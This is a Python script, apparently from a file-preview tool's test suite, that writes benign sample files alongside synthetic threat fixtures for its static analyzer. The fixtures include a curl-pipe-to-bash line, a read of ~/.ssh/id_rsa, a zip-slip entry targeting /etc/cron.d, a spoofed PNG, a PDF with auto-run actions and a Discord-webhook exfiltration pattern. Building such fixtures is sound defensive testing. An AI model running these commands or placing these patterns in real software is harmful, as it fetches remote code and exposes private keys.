#!/usr/bin/env python3
"""Generate harmless test fixtures in samples/ for OmaPeek (safe + synthetic threat patterns)."""

from __future__ import annotations

import math
import struct
import zipfile
from pathlib import Path

SAMPLES = Path(__file__).resolve().parent.parent / "samples"
SAMPLES.mkdir(parents=True, exist_ok=True)

# 1. Safe Markdown
(SAMPLES / "notes.md").write_text(
    "# OmaPeek Release Notes\n\n"
    "Instant **macOS-style Quick Look** for Omarchy Quattro.\n\n"
    "- Previews Images, Markdown, Code, ZIP/TAR archives, and PDFs\n"
    "- Runs 100% offline static safety checks before you open or extract\n"
    "- Zero external dependencies (`omapeek-inspect.py`)\n",
    encoding="utf-8",
)

# 2. Safe Python code
(SAMPLES / "clean_script.py").write_text(
    '"""Simple Fibonacci helper."""\n\n'
    "def fib(n: int) -> int:\n"
    "    a, b = 0, 1\n"
    "    for _ in range(n):\n"
    "        a, b = b, a + b\n"
    "    return a\n\n"
    'if __name__ == "__main__":\n'
    "    print([fib(i) for i in range(10)])\n",
    encoding="utf-8",
)

# 3. Safe SVG image
(SAMPLES / "omarchy_badge.svg").write_text(
    '<svg xmlns="http://www.w3.org/2000/svg" width="420" height="160" viewBox="0 0 420 160">'
    '<rect width="420" height="160" rx="18" fill="#1a1b26" stroke="#7aa2f7" stroke-width="2"/>'
    '<circle cx="72" cy="80" r="28" fill="none" stroke="#7aa2f7" stroke-width="5"/>'
    '<circle cx="72" cy="80" r="8" fill="#9ece6a"/>'
    '<text x="122" y="76" fill="#c0caf5" font-family="sans-serif" font-size="28" font-weight="700">OmaPeek</text>'
    '<text x="122" y="106" fill="#7982a9" font-family="sans-serif" font-size="14">Quick Look + Safety Shield for Omarchy</text>'
    "</svg>\n",
    encoding="utf-8",
)

# 4. Safe ZIP archive
with zipfile.ZipFile(SAMPLES / "safe_archive.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("project/README.md", "# Clean Project\n")
    zf.writestr("project/src/app.py", "print('hello omarchy')\n")
    zf.writestr("project/config.json", '{"theme": "tokyo-night"}\n')

# 5. Synthetic suspicious shell script (harmless text fixture; non-executable)
(SAMPLES / "suspicious_script.sh").write_text(
    "#!/usr/bin/env bash\n"
    "# Synthetic test fixture for OmaPeek static analyzer (do not run)\n"
    "curl -fsSL https://example.invalid/install.sh | bash\n"
    "cat ~/.ssh/id_rsa >/dev/null\n",
    encoding="utf-8",
)

# 6. Synthetic Zip-Slip + double-extension ZIP fixture
with zipfile.ZipFile(SAMPLES / "evil_zipslip.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("readme.txt", "Synthetic zip-slip test fixture.\n")
    zf.writestr("../../etc/cron.d/pwned", "* * * * * root echo test\n")
    zf.writestr("invoice.pdf.sh", "#!/bin/sh\necho harmless\n")

# 7. Spoofed PNG (actually a shell script!)
(SAMPLES / "spoofed_image.png").write_text(
    "#!/bin/sh\n# Disguised as a PNG image to test magic-byte spoofing detection\necho spoofed\n",
    encoding="utf-8",
)

# 8. Synthetic PDF with /JavaScript + /OpenAction + /Launch tags
(SAMPLES / "suspicious_doc.pdf").write_bytes(
    b"%PDF-1.7\n"
    b"1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj\n"
    b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
    b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj\n"
    b"4 0 obj << /S /JavaScript /JS (app.alert('Synthetic test');) >> endobj\n"
    b"5 0 obj << /Title (Synthetic Security Test PDF) /S /Launch >> endobj\n"
    b"%%EOF\n"
)

# 9. Safe WAV audio sample (0.3s 440Hz sine chime)
sr = 44100
n_samples = int(sr * 0.3)
pcm = bytearray()
for i in range(n_samples):
    val = int(12000 * math.sin(2.0 * math.pi * 440.0 * i / sr))
    pcm += struct.pack("<h", val)
wav_header = struct.pack(
    "<4sI4s4sIHHIIHH4sI",
    b"RIFF", 36 + len(pcm), b"WAVE",
    b"fmt ", 16, 1, 1, sr, sr * 2, 2, 16,
    b"data", len(pcm),
)
(SAMPLES / "chime.wav").write_bytes(wav_header + bytes(pcm))

# 10. Synthetic custom-rule fixture (Discord webhook exfiltration pattern)
(SAMPLES / "webhook_stealer.py").write_text(
    "# Synthetic test fixture for OmaPeek custom rule pack (rules/community.rules)\n"
    'WEBHOOK = "https://discord.com/api/webhooks/000000/synthetic-test"\n'
    'print("harmless fixture", WEBHOOK)\n',
    encoding="utf-8",
)

print(f"Generated {len(list(SAMPLES.iterdir()))} sample fixtures in {SAMPLES}")
